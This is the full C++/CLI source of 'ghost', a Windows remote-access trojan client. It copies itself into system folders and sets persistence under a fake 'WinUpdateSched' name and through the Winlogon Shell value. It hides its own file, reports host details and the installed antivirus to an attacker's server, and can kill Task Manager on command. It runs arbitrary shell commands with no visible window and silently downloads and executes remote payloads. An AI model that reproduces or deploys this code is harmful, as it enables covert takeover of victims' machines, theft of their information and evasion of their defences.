/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2018

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#define						GHOSTVER						"1.0.3b"
#define						DEFAULT_BUFF					19056
#define						TMPLOG							"svchost.log"
//#define					GHOST_HIDE						/* DEBUG */
//#define					AHXRLOGGER_PLUGIN				// https://github.com/AHXR/ahxrlogger

// 64-bit automatically redirected to "HKLM\SOFTWARE\Wow6432Node"
#define						KEY_TARGET						HKEY_LOCAL_MACHINE 
#define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
#define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define						KEY_ROOT_STARTUP				"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
#define						KEY_VALUE_NAME					"WinUpdateSched"
#define						KEY_SHELL_NAME					"Shell"

#include					"ahxrwinsock.h"
#include					"resource.h"
#include					"json.hpp"
#include					"info.h"
#include					"encrypt.h"

#include					<Shellapi.h>
#include					<Lmcons.h>
#include					<fstream>

using namespace				std;
using namespace				System::Runtime::InteropServices;
using						json = nlohmann::json;

PCSTR						str_host;
PCSTR						str_port;
TCHAR						str_temp[MAX_PATH];
TCHAR						str_windows[MAX_PATH];
char						c_temp_cmd[ MAX_PATH + 20 ];
char						c_cmd_dir[MAX_PATH + 7];
bool						b_cmd;
bool						b_taskmgr;
HANDLE						h_payload;
AHXRCLIENT					client;

void						onClientConnect();
void						onClientRecData( char * data);
DWORD WINAPI				t_ping(LPVOID lpParams);
DWORD WINAPI				t_payloads(LPVOID lpParams);


#pragma comment				(lib, "shell32.lib")
#pragma comment				(lib, "Advapi32.lib")
#pragma comment				(lib, "Wininet.lib")

void main(cli::array<System::String^>^ args)
{
	if (args->Length < 2) // IP and Port;
		exit(EXIT_FAILURE);

	// String to PCSTR (const char *)
	str_host = (const char * ) Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
	str_port = (const char * ) Marshal::StringToHGlobalAnsi(args[1]).ToPointer();

#ifndef GHOST_HIDE
	HMODULE			h_mod;
	char *			c_path[MAX_PATH];
	char 			c_new_path[MAX_PATH + FILENAME_MAX + 1];
	string			s_path;
	string			s_file_name;
	bool			b_admin_access;

	h_mod = GetModuleHandleW(NULL);
	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);

	s_path = (char *)c_path;
	s_file_name = s_path.substr(s_path.find_last_of('\\') + 1); // Getting the file name.
	s_path = s_path.substr( 0, s_path.find_last_of('\\')); // Just the path of the executed location.

	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe

	if (strcmp(s_path.c_str(), str_windows) != 0 && ( strcmp( string(string(s_path) + "\\").c_str(), str_temp) != 0 )) {
		sprintf(c_new_path, "%s\\%s", str_windows, s_file_name.c_str());

		fstream f_file_read((char *)c_path, ios::in | ios::binary);
		fstream f_file_write(c_new_path, ios::out | ios::binary);
		
		if (f_file_write.good() || f_file_write.is_open()) { // No permission
			f_file_write << f_file_read.rdbuf();

			f_file_read.close();
			f_file_write.close();
		}
		else {
			sprintf(c_new_path, "%s%s", str_temp, s_file_name.c_str());
			fstream f_file_write(c_new_path, ios::out | ios::binary);

			f_file_write << f_file_read.rdbuf();

			f_file_read.close();
			f_file_write.close();
		}

		char paramFormat[ 23 ];
		sprintf(paramFormat, "%s %s", str_host, str_port);

		ShellExecute(NULL, "open", c_new_path, paramFormat, 0, 0);
		exit(EXIT_SUCCESS);
	}

	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);

	remove(c_temp_cmd); // Remove previous instance.

	/*
		Attempting to add to the Shell start-up. This is so that the zombie runs in safemode as well.
		This will also hide this application from CCleaner or any other application that scans for start-up 
		programs.
	*/
	HKEY h_key;
	long l_key;
	bool b_good;

	l_key = RegOpenKeyEx(KEY_TARGET, KEY_ROOT_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

	if (l_key == ERROR_SUCCESS) {
		char * full_path = new char[MAX_PATH + 50];
		sprintf(full_path, "explorer.exe,\"%s %s %s\"", c_path, str_host, str_port);
		long l_set_key = RegSetValueEx(h_key, KEY_SHELL_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);

		if (l_set_key == ERROR_SUCCESS)
			b_good = true;

		RegCloseKey(h_key);
	}

	if (!b_good) {
		// Adding to start-up since we couldn't use the Shell start-up.
		l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);

		// No admin access. Just make it user startup.
		if (l_key == ERROR_ACCESS_DENIED) {
			l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
			b_admin_access = true;
		}

		if (l_key == ERROR_SUCCESS) {
			char * full_path = new char[MAX_PATH + 50];
			sprintf(full_path, "\"%s\" %s %s", c_path, str_host, str_port);

			RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
			RegCloseKey(h_key);
		}
	}

	SetFileAttributes((char *)c_path, FILE_ATTRIBUTE_HIDDEN);
#else
	GetTempPath(MAX_PATH, str_temp); // Temp path for returning cmd response.
	GetSystemDirectory(str_windows, MAX_PATH);  // Looking for cmd.exe

	sprintf(c_temp_cmd, "%s%s", str_temp, TMPLOG);
	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);
#endif

	h_payload = CreateThread(NULL, NULL, &t_payloads, 0, 0, 0);

	// Starting and idling server
	while (1) {
		if( client.init(str_host, str_port, TCP_SERVER, onClientConnect) ) 
			client.listen(onClientRecData, false);

		if (client.Socket_Client != INVALID_SOCKET)
			closesocket(client.Socket_Client);

		b_cmd = false; // Safe reset
		Sleep(1000);
	}
}

DWORD WINAPI t_payloads(LPVOID lpParams) {
	while (1) {
		if (b_taskmgr) {
			DWORD d_task = FindProcessId(L"taskmgr.exe");
			if (d_task != 0) {
				HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, TRUE, d_task);
				TerminateProcess(h_process, 1);
			}
		}
		
		Sleep(100);
	}
}

DWORD WINAPI t_ping(LPVOID lpParams) {
	while (1) {
		Sleep(3000);
		char buf;
		int err = recv(client.Socket_Client, &buf, 1, MSG_PEEK);
		if (err == SOCKET_ERROR)
		{
			if (WSAGetLastError() != WSAEWOULDBLOCK)
			{
				client.close();
				break;
			}
		}
	}
	return 0;
}

void onClientConnect() {
	json			sys_data;
	TCHAR			c_comp_name[ MAX_COMPUTERNAME_LENGTH + 1 ];
	DWORD			c_comp_size;
	DWORD			c_username_size = UNLEN + 1;
	char			c_username[UNLEN + 1];
	
	c_comp_size		= sizeof(c_comp_name);
	GetComputerName(c_comp_name, &c_comp_size);
	GetUserName(c_username, &c_username_size);


	sys_data["ID"] = c_comp_name;
	sys_data["USER"] = c_username;
	sys_data["IP"] = real_ip();
	sys_data["PORT"] = str_port;
	sys_data["AV"] = getAntivirus();
	sys_data["VERSION"] = GHOSTVER;

	OSVERSIONINFO vi;
	vi.dwOSVersionInfoSize = sizeof(vi);

	string os_output = "Unknown"; 
	if (GetVersionEx(&vi) != 0) {
		switch (vi.dwMajorVersion) {
			case 10: {
				os_output = "Windows 10";
				break;
			}
			case 6: {
				if (vi.dwMinorVersion == 3)
					os_output = "Windows 8.1";
				else if (vi.dwMinorVersion == 2)
					os_output = "Windows 8";
				else if (vi.dwMinorVersion == 1)
					os_output = "Windows 7";
				else
					os_output = "Windows Vista";
				break;
			}
			case 5: {
				if (vi.dwMinorVersion == 2)
					os_output = "Windows Server 2003 R2";
				else if (vi.dwMinorVersion == 1)
					os_output = "Windows XP";
				else if (vi.dwMinorVersion == 0)
					os_output = "Windows 2000";
				break;
			}
			default: {
				os_output = "Unknown";
				break;
			}
		}

#ifdef _WIN32
		os_output += " 32-bit";
#elif _WIN64
		os_output += " 64-bit";
#endif
	}
	sys_data["OS"] = os_output;

	client.send_data(encryptCMD(sys_data.dump()).c_str());

	CreateThread(0, 0, t_ping, 0, 0, 0);
}

void onClientRecData( char * data ) {

	// Removing encryption.
	if (strcmp(data, "CMD") != 0) {
		string s_data = data;
		s_data = unencryptCMD(s_data);
		strcpy(data, s_data.data());
	}
	
	int i_len			= strlen(data) + MAX_PATH + 1;
	char * c_output		= new char[i_len];
	char * c_new_data	= new char[strlen(data) + 1];
	bool b_skip = false;;

	strcpy(c_new_data, data);
	c_output[i_len - 1] = '\0';

	/*fstream f_test("debug.txt", ios::out | ios::binary);
	f_test << c_new_data;
	f_test.close();
	*/

	/*
		The keyword "ghost_ping" is strictly for the server to determine whether the socket is
		active or not. Any data that is simply "ghost_ping" will be ignored.
	*/
	if (!strcmp(c_new_data, "ghost_ping"))
		b_skip = true;

	if (!strcmp(c_new_data, "ghost_tskmgr")) {
		b_taskmgr = !b_taskmgr;
		client.send_data(encryptCMD(string(b_taskmgr ? "Task Manager Killer Enabled" : "Task Manager Killer Disabled")).c_str());
		b_skip = true; // Nullifying by using the magical keyword
	}

	// b_skip determines whether the server is doing commands or not.
	if ( !b_skip ) {
		if (!strcmp(c_new_data, "CMD")) // Toggling Command Prompt response 
			b_cmd = !b_cmd;
		else {
			if (b_cmd) {

				int				i_length;
				fstream			f_response;

				sprintf(c_output, "/C %s > %s", c_new_data, c_temp_cmd);

				/*
					Running the command without a window. Using WinExec, system, or ShellExecute will make
					a random command prompt pop-up. This will make it obvious that something is going on 
					in the background, which voids the whole point of "ghost".
				*/
				STARTUPINFO info = { sizeof(info) };
				PROCESS_INFORMATION processInfo;
				if (CreateProcess(c_cmd_dir, c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo)) {
					WaitForSingleObject(processInfo.hProcess, 5000);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				/*
					In c_output, the right carrot symbol writes the output to a file. Here, we are going to 
					read that file and send the result back to the server. This is so the server knows what 
					happened with their command.

					Certain commands will return no response, which is fine. However, as far as I'm concerned,
					invalid commands do not write to a file.
				*/
				f_response.open(c_temp_cmd, ios::in | ios::binary);

				f_response.seekg(0, f_response.end);
				i_length = (int)f_response.tellg();
				f_response.seekg(0, f_response.beg);

				if (i_length > 0) {
					char * c_read = new char[i_length];
					f_response.read(c_read, i_length);

					// Null terminating. Without this, there will be gibberish at the end of the data.
					c_read[i_length] = '\0';
					if (c_read[i_length - 1] == '\n')
						c_read[i_length - 1] = '\0';

					client.send_data(encryptCMD( string( c_read ) ).c_str());
				}
				else
					client.send_data(encryptCMD(string("Invalid command or empty response.")).c_str());

			}

			// "Download & Execute"
			if (!b_cmd && strcmp(c_new_data, "CMD") != 0) {
				HRSRC			hr_res;
				DWORD32			dw_res;
				LPVOID			lp_res;
				LPVOID			lp_res_lock;

				// Creating the wget file.
				hr_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
				dw_res = ::SizeofResource(NULL, hr_res);
				lp_res = LoadResource(NULL, hr_res);
				lp_res_lock = LockResource(lp_res);

				fstream f_wget("wget.exe", ios::out | ios::binary);
				f_wget.write((char *)lp_res, dw_res);
				f_wget.close();

				SetFileAttributes("wget.exe", FILE_ATTRIBUTE_HIDDEN);

				// Fetching the sent data.
				json j_response = json::parse(c_new_data);
				sprintf(c_output, "/C wget %s -O %s", j_response["URL"].get<string>().c_str(), j_response["FILE"].get<string>().c_str());
	
				// Running wget.exe in the background. Hiding the command prompt as well. Silent downloading.
				STARTUPINFO info = { sizeof(info) };
				PROCESS_INFORMATION processInfo;
				if (CreateProcess("wget.exe", c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo))
				{
					WaitForSingleObject(processInfo.hProcess, INFINITE);
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				char c_dir[MAX_PATH];
				string s_dir;
				GetModuleFileName(NULL, c_dir, MAX_PATH);

				string::size_type pos = string(c_dir).find_last_of("\\/");
				s_dir = string(c_dir).substr(0, pos);

				sprintf(c_output, "%s has downloaded and saved at: %s\\%s\nNow executing...",
					j_response["URL"].get<string>().c_str(),
					s_dir.c_str(),
					j_response["FILE"].get<string>().c_str()
					);

				client.send_data(encryptCMD(string(c_output)).c_str());

				// Running the downloaded file and removing wget.exe
				ShellExecute(NULL, "open", j_response["FILE"].get<string>().c_str(), 0, 0, 0);
				remove("wget.exe");
			}
		}
	}
}